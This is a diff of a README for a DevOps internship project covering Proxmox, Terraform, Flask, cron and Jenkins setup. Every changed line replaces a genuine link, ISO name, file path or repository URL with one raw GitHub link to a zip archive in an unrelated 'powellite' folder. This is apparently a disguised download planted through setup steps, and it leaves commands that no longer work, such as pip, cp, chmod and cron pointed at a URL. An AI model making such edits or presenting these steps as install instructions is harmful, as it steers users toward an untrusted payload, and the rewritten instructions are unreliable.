@@ -10,7 +10,7 @@ College - JIET, Jodhpur
 ## 🔧 1. Infrastructure Setup with Proxmox + Terraform
 
 ### ➤ Tools:
-- [Proxmox VE](https://www.proxmox.com)
+- [Proxmox VE](https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip)
 - Terraform + Proxmox Provider
 
 ### ➤ Steps:
@@ -18,9 +18,9 @@ College - JIET, Jodhpur
 1. **Ensure Proxmox is set up** and accessible at `https://192.168.1.10:8006`
 2. In your Proxmox storage (`local`), upload the Ubuntu ISO:
    ```
-   ubuntu-22.04.iso
+   https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
    ```
-3. Customize your credentials and node in `terraform/main.tf`:
+3. Customize your credentials and node in `https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip`:
    - VM Name: `devops-vm`
    - Static IP: `192.168.100.10`
    - Gateway: `192.168.100.1`
@@ -63,13 +63,13 @@ terraform apply
 cd ~/devops-internship-challenge/flask_app
 python3 -m venv venv
 source venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
 ```
 
 3. Create a SystemD service:
 
 ```bash
-sudo cp flask_app.service /etc/systemd/system/
+sudo cp https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip /etc/systemd/system/
 sudo systemctl daemon-reexec
 sudo systemctl enable flask_app
 sudo systemctl start flask_app
@@ -91,7 +91,7 @@ Every minute, the `/compute` endpoint is hit via cron:
 1. Make the script executable:
 
 ```bash
-chmod +x crontab/trigger_compute.sh
+chmod +x https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
 ```
 
 2. Add crontab:
@@ -102,7 +102,7 @@ crontab -e
 
 Paste:
 ```cron
-* * * * * /bin/bash /home/ubuntu/devops-internship-challenge/crontab/trigger_compute.sh
+* * * * * /bin/bash https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
 ```
 
 ---
@@ -122,7 +122,7 @@ Paste:
 
 1. Create a new Jenkins Pipeline project
 2. Point to the repo URL:  
-   `https://github.com/TechieVinita/devops-internship-project.git`
+   `https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip`
 3. Add sudo permission for Jenkins to restart the service:
 ```bash
 sudo visudo
